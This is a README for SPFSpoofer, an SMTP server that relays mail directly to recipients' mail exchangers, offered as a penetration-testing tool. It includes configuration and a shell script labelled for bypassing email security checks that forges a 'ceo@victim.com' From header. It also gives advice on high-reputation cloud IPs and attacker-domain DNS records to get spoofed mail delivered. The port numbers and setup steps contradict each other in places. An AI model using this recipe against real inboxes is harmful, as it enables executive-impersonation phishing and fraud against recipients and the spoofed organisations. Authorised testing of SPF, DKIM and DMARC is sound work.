# SPFSpoofer

<div align="center">

**A single-process SMTP server for security testing, penetration testing, and email deliverability demonstrations**

[![Python](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-Educational%20Use-orange.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Purpose-Security%20Testing-red.svg)](https://github.com/piratesshield/SPFSpoofer)

</div>

---

## 🎯 Overview

SPFSpoofer is a specialized SMTP server designed for cybersecurity professionals, penetration testers, and security researchers to demonstrate email spoofing vulnerabilities and test SPF/DKIM/DMARC validation mechanisms in controlled lab environments.

<span style="color:red"><b>⚠️NOTE : <br>* Change the <Attacker's Doamin> with your own domain in the v2.0 script .<br>* You need to create the DKIM , DMARC and SPF records in your own DNS server to avoid email delivery fail. <br>* Generate DKIM private and Public key using the OpenSSL
<br>* MX record of attacker's email server should be created with right and high reputated IP Addresses (make sure you are running the script from a cloud server)</b></span>

### Key Features

- **Dual-Port Acceptor**: Listens on ports 25 and 2525 (plain SMTP, no AUTH/TLS)
- **Local Relay**: Internal relay on 127.0.0.1:2526 for message processing
- **Flexible DKIM Handling**:
  - Real DKIM signing with private keys
  - Automatic fallback to dummy DKIM signatures
- **Direct-to-MX Delivery**: Opportunistic STARTTLS support for recipient MTAs
- **Message Archiving**: Saves raw and signed messages for analysis

### Use Cases

✅ Demonstrating SPF/DKIM/DMARC validation at receiver side  
✅ Testing brand/domain spoofing scenarios  
✅ Security awareness training and phishing simulations  
✅ Email security research and vulnerability assessment  
✅ Lab exercises requiring custom SMTP infrastructure

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This tool is intended solely for:
- Controlled laboratory environments
- Authorized penetration testing engagements
- Internal security assessments with proper authorization
- Educational demonstrations by cybersecurity professionals

**Unauthorized use of this tool to:**
- Send unsolicited emails (spam)
- Impersonate domains without permission
- Conduct phishing attacks
- Violate computer fraud and abuse laws

**...is ILLEGAL and subject to criminal prosecution.**

By using this tool, you agree to comply with all applicable laws and regulations.

---

## 📋 Requirements

### System Requirements
- **Operating System**: Linux (Ubuntu/Debian/CentOS recommended), macOS, or Windows WSL
- **Python**: 3.9 or higher
- **Privileges**: Root/sudo access required for binding to port 25

### Python Dependencies

```bash
pip install aiosmtpd dkimpy dnspython
```

Or with sudo for system Python:

```bash
sudo python3 -m pip install aiosmtpd dkimpy dnspython
```

---

## 🚀 Quick Start Guide

### Step 1: Edit Configuration

Open `spfspoofer.py` and modify the configuration section:

```# =========================
# Config
# =========================
HELLO_NAME = "<Attackers Email server URL>" #E.g. mail.spfattackers.com

# Listeners
ACCEPTOR_HOST = ""
ACCEPTOR_PORT_25 = 25
ACCEPTOR_PORT_2525 = 2525

RELAY_HOST = "127.0.0.1"
RELAY_PORT = 2526

# Storage
SAVE_DIR = "demo/smtp_demo/"

# DKIM
DKIM_PRIVKEY_PATH = "dkim_key.key" #create your own DKIM key using openSSL & update the public key in Attacker's DNS Server
DKIM_SELECTOR = b"default"
DKIM_DOMAIN = b"<Attackers Email  Domain>"
HEADERS_TO_SIGN = [b"from", b"to", b"subject", b"date", b"message-id", b"mime-version", b"content-type"]

# DNS/SMTP tuning
MX_LOOKUP_TIMEOUT = 10
SMTP_TIMEOUT = 60
MAX_MX = 5
RETRY_PER_MX = 1
UPGRADE_STARTTLS_TO_MX = True

# =========================
# Utils
# =========================
def ensure_dirs():
    Path(SAVE_DIR).mkdir(parents=True, exist_ok=True)

def normalize_headers(raw_bytes: bytes) -> bytes:
    msg = BytesParser(policy=default_policy).parsebytes(raw_bytes)
    if not msg.get("Date"):
        msg["Date"] = formatdate(localtime=True)
    if not msg.get("Message-ID"):
        msg["Message-ID"] = make_msgid(domain="<Attackers Email  Domain>")
    return msg.as_bytes()
```

**Configuration Placeholders to Replace:**
- `<Attacker's EMail Domain>` → Your testing domain (e.g., `mail.testlab.local`)
- `<Victim Dmain>` → Target domain for testing (e.g., `victim.example.com`)
- `<DKIM private key path>` → Path to DKIM key (e.g., `/tmp/dkim_key.pem`)
- `<log stroage path>` → Log directory (e.g., `/tmp/smtp_demo`)

### Step 3: Start the Server

```bash
python3 spfspoofer.py
```

**Expected Output:**
```
SMTP server ready (no logs)
```

### Step 4: Test with Telnet

Open a new terminal window:

```bash
telnet 127.0.0.1 25
```

### Step 5: Send Test Email

Execute these SMTP commands in order:

```
EHLO test.local
MAIL FROM:<sender@attacker.example>
RCPT TO:<victim@gmail.com>
DATA
```

After the `DATA` command, type or paste the complete email:

```
From: "Security Test" <sender@attacker.example>
To: victim@gmail.com
Subject: SPFSpoofer Test Email
Date: Wed, 24 Dec 2024 17:42:00 +0530
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

This is a test message from SPFSpoofer.
This is line 2 of the body.

Testing DKIM signing and SPF validation.
.
QUIT
```
**OR USE THE BELOW SHELL SCRIPT HELP TO BYPASS THE EMAIL SECURITY CHECK**
''' #!/bin/bash

echo "Testing SMTP with comprehensive RFC 5322 headers on port 25..."

# Ensure the output directory exists
mkdir -p /tmp/smtp_demo/

(
# SMTP Envelope
echo "EHLO mail.spfatackers.com" #Change with your email email server URL
sleep 0.5
echo "MAIL FROM:<jgboard@spfatackers.com>" #Email ID used for the attack. DO not remove the '<>'
sleep 0.5
echo "RCPT TO:<user1@victim.com>" #victims Email Address.DO not remove the '<>'
sleep 0.5
echo "DATA"
sleep 0.5

# RFC 5322 & MIME Headers
echo "from: ceo@victim.com" #victim's spoofing email Address 
echo "To: user1@victim.com"
echo "Date: $(date -R)"
echo "Subject: Example Email Subject"
echo "Message-ID: <$(date +%s%N).curl@victim.com>"
echo "Comments: Optional comments"
echo "Keywords: keyword1, keyword2"
echo "MIME-Version: 1.0"
echo "Content-Type: text/plain; charset=\"UTF-8\""
echo "Content-Transfer-Encoding: 7bit"

# Mandatory blank line separating headers from body
echo ""

# Message Body
echo "This is the body of the email message."
echo ""
echo "According to RFC 5322 rules:"
echo "- A blank line separates headers and body."
echo "- Body can contain plain text or MIME content."

# End of DATA indicator
echo "."
sleep 0.5
echo "QUIT"
) | telnet 127.0.0.1 25

echo -e "\n\nChecking saved messages:"
ls -lh /tmp/smtp_demo/
'''
**Important Notes:**
- Leave a blank line between headers and body
- End with a single dot (`.`) on its own line
- Type `QUIT` to disconnect

---

## 📊 Expected Results

### Successful SMTP Session

```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 yourhostname Python SMTP 1.4.4.post2
EHLO test.local
250-yourhostname Hello test.local
250 HELP
MAIL FROM:<sender@attacker.example>
250 OK
RCPT TO:<victim@gmail.com>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
From: "Security Test" <sender@attacker.example>
To: victim@gmail.com
Subject: SPFSpoofer Test Email

This is a test message.
.
250 Message accepted for delivery
QUIT
221 Bye
Connection closed by foreign host.
```

### Message Flow Architecture

<img width="2816" height="1536" alt="Gemini_Generated_Image_3emlwg3emlwg3eml" src="https://github.com/user-attachments/assets/0ea838f2-3fff-47c3-869b-e9ff7274eb27" />


```
┌─────────────────┐
│   Telnet/SMTP   │
│     Client      │
└────────┬────────┘
         │ Connect to port 2527
         ▼
┌─────────────────┐
│   Acceptor      │
│  (0.0.0.0:2525) │
│  - Normalize    │
│  - DKIM Sign    │
│  - Save Message │
└────────┬────────┘
         │ Forward via port 2526
         ▼
┌─────────────────┐
│  Local Relay    │
│ (127.0.0.1:2526)│
│  - MX Lookup    │
│  - STARTTLS     │
└────────┬────────┘
         │ Deliver to port 25
         ▼
┌─────────────────┐
│ Recipient MTA   │
│ (gmail.com MX)  │
└─────────────────┘
```

---

## 🔍 Verification & Testing

### Check Saved Messages

```bash
ls -lh /tmp/smtp_demo/
cat /tmp/smtp_demo/msg_*_raw.eml
cat /tmp/smtp_demo/msg_*_signed.eml
```

### Verify Server Ports

```bash
# Check acceptor ports
netstat -tlnp | grep 2527
netstat -tlnp | grep 2528

# Check relay port
netstat -tlnp | grep 2526

# Alternative using ss command
ss -tlnp | grep 252
```

### Inspect DKIM Headers

```bash
grep -i "DKIM-Signature" /tmp/smtp_demo/msg_*_signed.eml
```

---

## 🛠️ Advanced Configuration

### Running on Standard Port 25 (Requires Root)

```bash
# Stop conflicting services first
sudo systemctl stop postfix
sudo systemctl stop sendmail

# Edit configuration to use port 25
ACCEPTOR_PORT_25 = 25

# Run with sudo
sudo python3 spfspoofer.py
```

### Custom DKIM Configuration

```python
# For real DKIM signing
DKIM_PRIVKEY_PATH = "/etc/dkim/keys/private.key"
DKIM_SELECTOR = b"default"
DKIM_DOMAIN = b"yourdomain.com"
HEADERS_TO_SIGN = [b"from", b"to", b"subject", b"date"]
```

### DNS Records for Realistic Testing

```dns
; SPF Record
yourdomain.com.    IN TXT "v=spf1 ip4:YOUR_IP -all"

; DKIM Record
default._domainkey.yourdomain.com. IN TXT "v=DKIM1; k=rsa; p=YOUR_PUBLIC_KEY"

; DMARC Record
_dmarc.yourdomain.com. IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com"
```

---

## 🔧 Troubleshooting

### Permission Denied (Port 25)

**Issue**: Cannot bind to port 25 without root privileges

**Solution**:
```bash
# Option 1: Run with sudo
sudo python3 spfspoofer.py

# Option 2: Use high ports (already configured in Step 1)
ACCEPTOR_PORT_25 = 2527
```

### Port Already in Use

**Issue**: Another service is using the port

**Solution**:
```bash
# Find what's using the port
sudo lsof -i :2527
sudo netstat -tlnp | grep 2527

# Stop the conflicting service or change ports
ACCEPTOR_PORT_25 = 3527
ACCEPTOR_PORT_2525 = 3528
```

### Connection Refused

**Check List**:
1. Verify server is running: `ps aux | grep spfspoofer`
2. Check firewall rules: `sudo iptables -L -n | grep 2527`
3. Ensure correct IP/port: `127.0.0.1:2527`
4. Test with netcat: `nc -zv 127.0.0.1 2527`

### Email Not Delivered to External Recipients

**Issue**: Outbound port 25 is blocked (common in cloud environments)

**Diagnosis**:
```bash
# Test outbound SMTP connectivity
telnet gmail-smtp-in.l.google.com 25
nc -zv gmail-smtp-in.l.google.com 25
```

**Solutions**:
- Contact your ISP/cloud provider to unblock outbound port 25
- Use VPN/proxy that allows SMTP
- Configure relay to use alternate smarthost

### DKIM Key Errors

**Issue**: DKIM private key not found or invalid

**Behavior**: Script automatically falls back to dummy DKIM signatures

**Verification**:
```bash
# Check if DKIM header exists in signed message
grep "DKIM-Signature" /tmp/smtp_demo/msg_*_signed.eml

# Verify key file exists and has correct permissions
ls -l /tmp/dkim_key.pem
```

---

## 📝 Automated Testing Script

Save as `test_spfspoofer.sh`:

```bash
#!/bin/bash

echo "Testing SPFSpoofer on port 2527..."

(
echo "EHLO test.local"
sleep 0.5
echo "MAIL FROM:<test@attacker.local>"
sleep 0.5
echo "RCPT TO:<recipient@victim.com>"
sleep 0.5
echo "DATA"
sleep 0.5
echo "From: test@attacker.local"
echo "To: recipient@victim.com"
echo "Subject: Automated Test - $(date)"
echo "Date: $(date -R)"
echo ""
echo "This is an automated test message."
echo "Timestamp: $(date)"
echo "."
sleep 0.5
echo "QUIT"
) | telnet 127.0.0.1 2527

echo -e "\n\nChecking saved messages:"
ls -lh /tmp/smtp_demo/
```

**Run**:
```bash
chmod +x test_spfspoofer.sh
./test_spfspoofer.sh
```

---

## 🔐 Security Best Practices

### Lab Environment Isolation

```bash
# Restrict access to localhost only
ACCEPTOR_HOST = "127.0.0.1"

# Firewall rules (iptables example)
sudo iptables -A INPUT -p tcp --dport 2527 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 2527 -j DROP
```

### Virtual Machine Setup

Recommended for isolated testing:
- Use VirtualBox/VMware/KVM
- Configure host-only network adapter
- Snapshot VM before testing
- Destroy/reset after testing

### Logging and Monitoring

```bash
# Run with output redirection for logging
python3 spfspoofer.py 2>&1 | tee /tmp/spfspoofer.log

# Monitor in real-time
tail -f /tmp/spfspoofer.log

# Monitor message directory
watch -n 1 'ls -lh /tmp/smtp_demo/'
```

---

## 🎓 Example Test Scenarios

### Scenario 1: SPF Hard Fail Demonstration

Test how receivers handle emails from unauthorized IPs:
- Configure SPF: `v=spf1 -all`
- Send from unauthorized server
- Analyze rejection/quarantine behavior

### Scenario 2: DKIM Validation Testing

Compare valid vs invalid DKIM signatures:
- Send with valid DKIM key
- Send with expired/invalid key
- Send without DKIM signature

### Scenario 3: Display Name Spoofing

Demonstrate social engineering via display names:
```
From: "CEO John Smith" <attacker@evil.com>
```

### Scenario 4: DMARC Policy Enforcement

Test DMARC none/quarantine/reject policies:
- p=none: Email delivered with report
- p=quarantine: Email goes to spam
- p=reject: Email bounced

---

## 📚 Additional Resources

### Understanding Email Authentication

- [RFC 7208 - SPF](https://tools.ietf.org/html/rfc7208)
- [RFC 6376 - DKIM](https://tools.ietf.org/html/rfc6376)
- [RFC 7489 - DMARC](https://tools.ietf.org/html/rfc7489)

### Tools for Analysis

- [MXToolbox](https://mxtoolbox.com/) - DNS and email testing
- [Mail-Tester](https://www.mail-tester.com/) - Email deliverability scoring
- [DKIM Validator](https://dkimvalidator.com/) - DKIM signature testing

---

## 🛑 Stopping the Server

Press `Ctrl+C` in the terminal running spfspoofer.py:

```
^CShutting down
```

Or kill the process:
```bash
pkill -f spfspoofer.py
```

---

## 🤝 Contributing

Contributions are welcome! Areas for improvement:
- Enhanced logging and verbose mode
- TLS/SSL support for testing
- Web interface for message inspection
- Additional authentication mechanisms
- Integration with email analysis tools

---

## 📜 License

This project is provided for **educational and authorized testing purposes only**. 

**No warranty is provided.** Use at your own risk and only in authorized environments.

---

## 👤 Author

**piratesshield**

- GitHub: [@piratesshield](https://github.com/piratesshield)
- Repository: [SPFSpoofer](https://github.com/piratesshield/SPFSpoofer)

---

## 🙏 Acknowledgments

- [aiosmtpd](https://aiosmtpd.readthedocs.io/) - Async SMTP server framework
- [dkimpy](https://launchpad.net/dkimpy) - DKIM signing library
- [dnspython](https://www.dnspython.org/) - DNS toolkit

---

<div align="center">

**⚠️ ETHICAL USE ONLY ⚠️**

This tool is designed for security professionals conducting authorized testing.  
Always obtain explicit written permission before testing any system you do not own.

**Unauthorized use may result in criminal prosecution.**

---

Made with 🔒 for the security community

</div>
